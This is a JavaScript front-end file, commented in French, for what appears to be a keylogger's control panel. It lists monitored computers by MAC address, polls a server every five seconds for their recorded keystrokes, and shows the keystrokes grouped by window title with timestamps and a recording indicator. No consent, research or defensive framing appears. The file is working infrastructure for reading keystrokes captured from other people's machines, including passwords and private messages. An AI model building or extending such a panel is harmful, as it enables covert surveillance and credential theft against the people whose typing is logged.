let logData = {}; // Stocke les frappes triées par fenêtre
let currentWindow = null; // Stocke la fenêtre sélectionnée
let selectedMac = null; // Stocke le MAC sélectionné

document.addEventListener("DOMContentLoaded", function () {
    const computerSelect = document.getElementById("computer-list");
    const logContent = document.getElementById("log-content");
    const windowList = document.createElement("ul");
    const mainMessage = document.getElementById("main-message");
    const recordingStatus = document.getElementById("recordingStatus");

    windowList.classList.add("window-list");
    document.querySelector(".sidebar").appendChild(windowList);

    async function fetchComputers() {
        try {
            const response = await fetch('/api/get_users');
            const data = await response.json();
            computerSelect.innerHTML = '<option value="">Select a tracked computer</option>';

            data.forEach(mac => {
                const option = document.createElement('option');
                option.value = mac;
                option.textContent = mac;
                computerSelect.appendChild(option);
            });
        } catch (error) {
            console.error("Erreur lors de la récupération des machines :", error);
        }
    }

    async function fetchData() {
        selectedMac = computerSelect.value;
        if (!selectedMac) {
            resetView();
            return;
        }

        try {
            const response = await fetch(`/api/get_data/${selectedMac}`);
            const data = await response.json();

            if (data.error) {
                logContent.innerHTML = `<p style="color: red;">${data.error}</p>`;
                return;
            }

            // Réinitialiser les données et regrouper les logs par fenêtre
            logData = {};
            data.forEach(entry => {
                const { window_mame } = entry;
                if (!logData[window_mame]) logData[window_mame] = [];
                logData[window_mame].push(entry);
            });

            // Mettre à jour la liste des fenêtres
            updateWindowsSidebar(Object.keys(logData));

            // Afficher tous les logs de l'ordinateur
            currentWindow = null;
            displayContent(data);

            // Mettre à jour l'affichage du statut d'enregistrement
            mainMessage.style.display = "none";
            recordingStatus.style.display = "block";

        } catch (error) {
            console.error("Erreur lors de la récupération des logs :", error);
        }
    }

    function resetView() {
        logContent.innerHTML = "";
        windowList.innerHTML = "";
        mainMessage.style.display = "block";
        recordingStatus.style.display = "none";
    }

    function updateWindowsSidebar(windows) {
        windowList.innerHTML = ""; // Vider la liste avant de la remplir

        if (windows.length === 0) {
            const emptyMessage = document.createElement("li");
            emptyMessage.textContent = "Aucune fenêtre détectée.";
            emptyMessage.style.color = "gray";
            windowList.appendChild(emptyMessage);
            return;
        }

        windows.forEach(windowName => {
            const listItem = document.createElement("li");
            listItem.textContent = windowName;
            listItem.classList.add("window-item");

            listItem.onclick = () => {
                document.querySelectorAll(".window-item").forEach(el => el.classList.remove("active"));
                listItem.classList.add("active");

                currentWindow = windowName;
                displayContent(logData[windowName]);
            };

            windowList.appendChild(listItem);
        });
    }

    function displayContent(content) {
        const isScrolledToBottom = logContent.scrollHeight - logContent.clientHeight <= logContent.scrollTop + 10;

        logContent.innerHTML = "";

        let lastWindow = null;
        let lastTimestamp = null;

        content.forEach(entry => {
            const { window_mame, timestamp, data } = entry;

            const dateObj = new Date(timestamp);
            const dateFormatted = dateObj.toLocaleDateString();
            const timeFormatted = dateObj.toLocaleTimeString();
            const fullTimestamp = `${dateFormatted} - ${timeFormatted}`;

            if (window_mame !== lastWindow && !currentWindow) {
                const windowTitle = document.createElement("h3");
                windowTitle.textContent = window_mame;
                windowTitle.style.fontWeight = "bold";
                windowTitle.style.marginTop = "10px";
                windowTitle.style.marginBottom = "5px";
                logContent.appendChild(windowTitle);

                lastWindow = window_mame;
                lastTimestamp = dateObj;
                appendTimestamp(fullTimestamp);
            }

            if (!lastTimestamp || (dateObj - lastTimestamp) >= 120000) {
                appendTimestamp(fullTimestamp);
                lastTimestamp = dateObj;
            }

            const dataElement = document.createElement("p");
            dataElement.textContent = data;
            dataElement.style.marginBottom = "5px";
            logContent.appendChild(dataElement);
        });

        if (isScrolledToBottom) {
            logContent.scrollTop = logContent.scrollHeight;
        }
    }

    function appendTimestamp(timestampText) {
        const timeElement = document.createElement("p");
        timeElement.innerHTML = `<strong>${timestampText}</strong>`;
        timeElement.style.fontSize = "11px";
        timeElement.style.fontWeight = "bold";
        timeElement.style.marginBottom = "5px";
        logContent.appendChild(timeElement);
    }

    fetchComputers();
    setInterval(fetchData, 5000);

    computerSelect.addEventListener("change", fetchData);
});
